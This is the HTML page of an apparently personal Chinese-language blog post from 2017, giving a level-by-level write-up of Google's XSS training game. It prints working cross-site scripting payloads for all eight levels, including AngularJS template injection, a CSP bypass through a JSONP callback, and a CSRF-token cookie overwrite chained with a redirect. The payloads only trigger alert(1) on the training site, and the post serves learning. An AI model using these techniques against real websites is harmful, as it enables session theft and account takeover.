@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Google xss game Write Up - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-7"><span class="toc-text">level 7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-8"><span class="toc-text">level 8</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Google xss game Write Up
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2017-08-26 22:49:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#xss" title="xss">xss</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>Google最新的xssgame</p>
+<span id="more"></span>
+
+
+<p><a target="_blank" rel="noopener" href="http://www.xssgame.com/">http://www.xssgame.com/</a>（需要翻墙，似乎还需要一个google账号）</p>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>第一关没啥难度，没有任何过滤。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xssgame.com/f/m4KKGHi2rVUN/?query=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/dLJjj0jeAk.png?imageslim" alt="mark"></p>
+<p>输出点有多处，一处在js函数中，DOM XSS。需要保证js的语法正确，否则无法执行。这里依然没有过滤。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>输出点变为<code>onload=&quot;startTimer(&#39;1&#39;);alert(&#39;1&#39;);&quot;</code></p>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/iADLGm88FB.png?imageslim" alt="mark"></p>
+<p>输出点在html属性中，但是这里不要被chrome骗了，使用双引号并不能截断。。。具体原因看一下js就知道了</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/l8584C5lCb.png?imageslim" alt="mark"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xssgame.com/f/u0hrDTsXmyVJ/#aaa&#x27; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>这个输出点比较难找，在跳转的地方抓包拦截，得到源码</p>
+<p><a target="_blank" rel="noopener" href="http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=welcome">http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=welcome</a></p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/hbBm4Gmahe.png?imageslim" alt="mark"></p>
+<p>这里有个问题就是如果我们闭合window.location这一行程序，然后alert的话（像这样<code>window.location = &#39;aaa&#39;; alert(&#39;1&#39;);</code>），页面还没有执行alert的时候就已经跳转了。所以这里使用JavaScript伪协议。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>这道题将<code>&lt;&gt;</code>转为html实体了，一般的payload就不好用了。查看源码后发现使用了<strong>angularjs</strong>，这里有一个近几年比较流行的新前端问题，<strong>模板注入</strong>。对于angularjs了解的不深，之后还要涨一波姿势。</p>
+<p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/2598.html">AngularJS－沙箱逃逸和XSS</a></p>
+<p><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3851.html">基于DOM的AngularJS沙箱逃逸技术</a></p>
+<p>这里的ng-non-bindable属性就相当于html标签中的pre标签，在这里面的所有属性都不会解析。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/eb51d00Dgk.png" alt="mark"></p>
+<p>这里使用angularJs的模板语法来执行js代码</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_campaign=&#123;&#123;$eval(&#x27;alert(1)&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>模板注入和别的不同，需要通过angularjs的渲染，所以html实体编码仍然可以。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xssgame.com/f/rWKWwJGnAeyi/?query=%26lcub;%26lcub;$eval(&#x27;alert(1)&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意&amp;要编码，否则服务端会将&amp;后的当做一个get参数</p>
+<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>到了这简单的找输出点然后构造的套路已经力度不够了，需要分析一下代码。</p>
+<p><a target="_blank" rel="noopener" href="http://www.xssgame.com/static/js/level7.js">http://www.xssgame.com/static/js/level7.js</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Ask server side what to display.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> m = location.<span class="property">search</span>.<span class="title function_">match</span>(<span class="string">&#x27;menu=(.*)&#x27;</span>); <span class="comment">//获取url中menu参数的值</span></span><br><span class="line">    <span class="keyword">var</span> menu = m ? <span class="title function_">atob</span>(m[<span class="number">1</span>]) : <span class="string">&#x27;about&#x27;</span>; <span class="comment">//atob是base64解码函数</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(menu) + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Display stuff returned from server side.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">data</span> - JSON data from server side</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">title</span>) <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;h1&gt;&#x27;</span> + data.<span class="property">title</span> + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>); <span class="comment">//未经处理直接输出</span></span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">pictures</span>) data.<span class="property">pictures</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/static/img/&#x27;</span> + url + <span class="string">&#x27;&quot;&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>
+
+<p>这两个函数大致的功能为main函数向服务端请求数据，得到数据后交给callback函数处理。可以注意到callback函数中直接将<code>data.title</code>输出了，这就有了可乘之机。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/J081HIgBJB.png" alt="mark"></p>
+<p>但是如果想直接在页面上输出<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>太天真了，毕竟这是level 7，人家部署了csp。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy	</span><br><span class="line">default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/</span><br></pre></td></tr></table></figure>
+
+<p>这里可能会有个疑问，主页不就是<code>http://www.xssgame.com/f/wmOM2q5NJnZS/</code>域下吗，为什么不能执行js代码？原因是在没有设置<code>script-src</code>的情况下，即使在<code>http://www.xssgame.com/f/wmOM2q5NJnZS/</code>域下也无法执行js代码，会报错。</p>
+<p>这里做一个简单的测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &#x27;http://127.0.0.1/test/csp/&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;1.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/2CDkm0am0d.png" alt="mark"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;Content-Security-Policy: default-src &#x27;http://127.0.0.1/test/csp/&#x27;; script-src &#x27;self&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;1.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/8L6hheH782.png" alt="mark"></p>
+<p>到这似乎有点卡住了，但是不要忘了jsonp，我们在使用jsonp获取数据后可以设置一个回调函数，处理获取到数据。那我们在页面上输出一个<code>&lt;script src=&quot;jsonp?callback=alert(1)//&quot;&gt;&lt;/script&gt;</code>不就行了。</p>
+<p>这里<code>alert(1)//</code>是一个函数名，由于js是弱类型语言，可以动态调用函数，所以在拿到数据会做类似于这样的处理<code>alert(1)//(the data)</code>，而<code>//</code>把后面的内容都注释了，就能成功弹窗了。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/A0ALCm8i41.png" alt="mark"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9Impzb25wP2NhbGxiYWNrPWFsZXJ0KDEpLy8iPjwvc2NyaXB0Pg==</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>依然是有csp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:	</span><br><span class="line">default-src http://www.xssgame.com/f/d9u16LTxchEi/ http://www.xssgame.com/static/</span><br></pre></td></tr></table></figure>
+
+<p>看看现有的条件：</p>
+<ol>
+<li><p>可以设置一个name，设置的值是存在cookie里的，而且接受redirect参数，确定跳转的位置。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/6CAF32gdGc.png" alt="mark"></p>
+</li>
+<li><p>第二个功能是设置参数（干啥的？），但是amount这个参数只接受整数，如果传入不是整数，那么就会报错，并返回输入的内容，这个部分存在xss。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/jGAb1clBA5.png" alt="mark"></p>
+<p>但是如果直接构造，会出现</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/FCafj9hAJJ.png" alt="mark"></p>
+<p>中心思想就是这么干不行。。。。这就引出了第三个条件。</p>
+</li>
+<li><p>存在一个csrf_token，需要绕过，这个csrf_token是存在cookie中的。</p>
+</li>
+</ol>
+<p>首先访问<code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=1</code>，这样就会把原先的csrf_token覆盖，这个token就是我们可控的了。</p>
+<p> <img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170822/IAaj53C1GB.png" alt="mark"></p>
+<p>设置完name之后可以设置跳转的位置，我们跳转到有xss的地方，构造payload弹窗即可。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=1&amp;redirect=transfer%3Fname%3D123%26amount%3D%3cimg%20src=1%20onerror=alert%281%29%3e%26csrf_token%3D1</span><br></pre></td></tr></table></figure>
+
+<p>跳转的部分记得编码，说过很多次了。。。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
